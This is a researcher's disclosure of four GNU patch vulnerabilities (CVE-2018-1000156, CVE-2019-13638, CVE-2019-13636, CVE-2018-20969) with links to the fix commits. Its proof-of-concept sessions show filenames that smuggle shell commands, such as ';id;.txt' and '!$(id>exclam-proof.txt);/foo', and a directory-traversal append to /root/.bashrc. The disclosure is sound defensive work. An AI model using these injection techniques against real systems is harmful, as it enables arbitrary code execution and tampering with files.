# GNU patch vulnerabilities

I identified several vulnerabilities in the GNU patch utility, some of them making it possible to execute 
arbitrary code if the victim opens a crafted patch file. It also turned out, some of these vulnerabilities
had been silently addressed by the maintainer back then in 2018 when CVE-2018-1000156 was reported by 
pushing some additional commits the same day, but only the primary patch was picked up by many Linux
distributions (like Debian, Ubuntu or Fedora).

## The vulnerabilities

### CVE-2018-1000156 - unrestricted ed input

This finding belongs to someone else, but unfortunately I'm unsure who the author is.
The original thread on the official bug report site:

https://savannah.gnu.org/bugs/?53566

The official patch of CVE-2018-1000156 is:

https://git.savannah.gnu.org/cgit/patch.git/commit/?id=123eaff0d5d1aebe128295959435b9ca5909c26d

According to the comment of the commit:
* src/pch.c (do_ed_script): Write ed script to a temporary file
instead of piping it to ed: this will cause ed to abort on invalid
commands instead of rejecting them and carrying on.


The thing is, `ed`'s behaviour is different when the script is coming
from a pipe (see the edoffset.script attached):

```
root@55c24e15f7e6:/data/edstyle5# touch whatever
root@55c24e15f7e6:/data/edstyle5# cat edoffset.script | ed whatever
0
?
!
0
root@55c24e15f7e6:/data/edstyle5# cat id-proof.txt
uid=0(root) gid=0(root) groups=0(root)
```

And when it is duped:

```
root@55c24e15f7e6:/data/edstyle5#  rm id-proof.txt
root@55c24e15f7e6:/data/edstyle5#  ed whatever < edoffset.script
0
?
root@55c24e15f7e6:/data/edstyle5# cat id-proof.txt
cat: id-proof.txt: No such file or directory
```

And now the same via patch:

```
root@55c24e15f7e6:/data/edstyle5# ../patch-2.7.6-vanilla/patch-2.7.6/src/patch  < CVE-2018-1000156.patch
patching file file
?
foo
../patch-2.7.6-vanilla/patch-2.7.6/src/patch: **** /bin/ed FAILED
root@55c24e15f7e6:/data/edstyle5# cat CVE-2018-1000156-proof.txt
uid=0(root) gid=0(root) groups=0(root)
```

`CVE-2018-1000156.patch` is pretty much the same as the original PoC created
for that issue (`poc.patch` among the attachments on savannah linked above).


### CVE-2019-13638 - Shell command injection while invoking ed

The GNU patch utility used to invoke `ed` via the shell interpreter and the filenames
were not sanitized correctly, making it vulnerable to shell command injection.
This way, exploitation of CVE-2019-13638 doesn't even require `ed` to be installed.

The official fix was commited the same day as for CVE-2018-1000156, but many distributions
didn't pick it up:

https://git.savannah.gnu.org/cgit/patch.git/commit/?id=3fcd042d26d70856e826a42b5f93dc4854d80bf0

The proof of concept:

```
root@3ffaeb445eab:/data/edstyle4# patch --version
GNU patch 2.7.6
...

root@3ffaeb445eab:/data/edstyle4# patch < CVE-2019-13638.patch
patching file ';id;.txt'
sh: 1: ed: not found
uid=0(root) gid=0(root) groups=0(root)
sh: 1: .txt.o60SfgR: not found
patch: **** ed FAILED
```

### CVE-2019-13636 - Directory traversal and file append

The directory traversal here made it possible to escape the working directory of patch
and append (almost) arbitrary file content to any files on the file system.

This finding is brand new and was fixed only after I reported it. Official patch:

https://git.savannah.gnu.org/cgit/patch.git/commit/?id=dce4683cbbe107a95f1f0d45fabc304acfb5d71a

When patch was saving a rejection, it did not check properly whether the file already
exists or not. This could be abused to escape the working dir:

```
root@3ffaeb445eab:/data/test1/test-apply3#  cat CVE-2019-13636.patch | patch
patching symbolic link home
patching symbolic link home.rej
File home is not a regular file -- refusing to patch
1 out of 1 hunk ignored -- saving rejects to file home.rej
patching symbolic link home
patching symbolic link home.rej


root@3ffaeb445eab:/data/test1/test-apply3# cat /root/.bashrc
# ~/.bashrc: executed by bash(1) for non-login shells.
...
# alias mv='mv -i'
--- home
+++ home
@@ -0,0 +1,3 @@
+ partially
+ controlled
+ content
```

### CVE-2018-20969 - OS shell command execution via ! prefixed ed filenames

If `ed` receives an exclaimation mark prefixed command line argument, it is executed
as a shell command via popen. This was exploitable via GNU `patch` as well.

Official fix:

https://git.savannah.gnu.org/cgit/patch.git/commit/?id=3fcd042d26d70856e826a42b5f93dc4854d80bf0

The referenced patch is the same as for CVE-2019-13638; note the assertion line.

(Yes, CVE-2018-20969 was reported by me in 2019 along with the other two and MITRE indeed 
assigned a 2018 ID for it)

Since `ed` is capturing the output of what it executes and the same version of GNU `patch` was vulnerable 
I decided to build 2 versions of `patch` with the above patch applied, one with the assertion line and
one without it.


```
root@a8e181dcb4b1:/data# diff /data/patch-3fcd042d26d70856e826a42b5f93dc4854d80bf0-assert/src/pch.c /data/patch-3fcd042d26d70856e826a42b5f93dc4854d80bf0-noassert/src/pch.c
2470c2470
<           assert (outname[0] != '!' && outname[0] != '-');
---
>           // assert (outname[0] != '!' && outname[0] != '-');

root@a8e181dcb4b1:/data/edstyle5# ../patch-3fcd042d26d70856e826a42b5f93dc4854d80bf0-assert/src/patch -p0 < CVE-2018-20969.patch
patching file '!$(id>exclam-proof.txt);/foo'
patch: pch.c:2470: do_ed_script: Assertion `outname[0] != '!' && outname[0] != '-'' failed.
../patch-3fcd042d26d70856e826a42b5f93dc4854d80bf0-assert/src/patch: **** ed FAILED
root@a8e181dcb4b1:/data/edstyle5# cat exclam-proof.txt
cat: exclam-proof.txt: No such file or directory


root@a8e181dcb4b1:/data/edstyle5# ../patch-3fcd042d26d70856e826a42b5f93dc4854d80bf0-noassert/src/patch -p0 < CVE-2018-20969.patch
patching file '!$(id>exclam-proof.txt);/foo'
sh: 1: /foo.oislN9J: not found
../patch-3fcd042d26d70856e826a42b5f93dc4854d80bf0-noassert/src/patch: **** ed FAILED
root@a8e181dcb4b1:/data/edstyle5# cat exclam-proof.txt
uid=0(root) gid=0(root) groups=0(root)
```



## Remediation

Upgrade to latest version of patch provided by your Operating System.
If you build it your own, bump to the head of the master branch.

